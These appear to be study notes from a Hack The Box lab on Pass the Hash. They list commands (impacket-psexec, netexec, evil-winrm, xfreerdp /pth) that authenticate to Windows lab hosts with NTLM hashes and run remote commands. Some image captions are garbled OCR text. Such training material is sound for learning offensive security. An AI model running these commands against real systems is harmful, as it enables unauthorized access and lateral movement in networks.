...
![steadile a privilege: :66304](Attachments/E058636E-A543-4BAF-80E4-B73C6E5AF9DD.jpg)  
...
![IP & Port](Attachments/CFB8D75B-C41C-486A-8F52-13517469B0C1.jpg)  
...
![wact to [172.16.1.51 fros (LAXT) (172.16.1.10] 58213](Attachments/4927061E-71F5-4479-A3E7-0D53E519A96B.jpg)  
...
Pass the Hash (PtH)  
```
Pavlo142@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
...
Pass the Hash (PtH)  
```
Pavlo142@htb[/htb]# netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
...
Pass the Hash (PtH)  
```
Pavlo142@htb[/htb]# netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
...
Pass the Hash (PtH)  
```
Pavlo142@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
...
![Account restrictions are preventing this user from signing in. For example: blank](Attachments/6062C215-A89A-418D-BC0B-E0D473541E36.png)  
...
```
![OSTerHCEY LOCAL MACHINE](Attachments/B56F5181-5264-41D2-8B60-109B82723F11.png)  
Once the registry key is added, we can use ****xfreerdp**** with the option ****/pth**** to gain RDP access:  
## Pass the Hash using RDP  
    
Pass the Hash (PtH)  
```
Pavlo142@htb[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
...
```
![ybe:329.2-.-26/sCofte /peh:64F120001400578064915(7389198](Attachments/FFCBE3EE-557C-410C-88E5-FE0AECAE6163.jpg)  
